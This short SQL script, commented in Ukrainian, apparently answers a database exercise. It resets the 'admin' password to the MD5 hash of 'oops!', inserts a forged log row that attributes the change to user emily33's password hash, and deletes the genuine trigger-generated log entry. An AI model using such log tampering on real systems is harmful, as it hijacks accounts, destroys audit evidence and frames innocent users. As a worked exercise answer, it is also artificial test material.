-- 1. Додаємо фальшивий лог, підставивши хеш emily33 замість нового пароля
INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
VALUES (
    'update',
    'admin',
    'admin',
    (SELECT "password" FROM "users" WHERE "username" = 'admin'),
    (SELECT "password" FROM "users" WHERE "username" = 'emily33')
);

-- 2. Змінюємо пароль admin на MD5-хеш від "oops!"
UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- 3. Видаляємо справжній лог змінити пароля, який автоматично створився тригером БД
DELETE FROM "user_logs"
WHERE "id" = (SELECT MAX("id") FROM "user_logs");
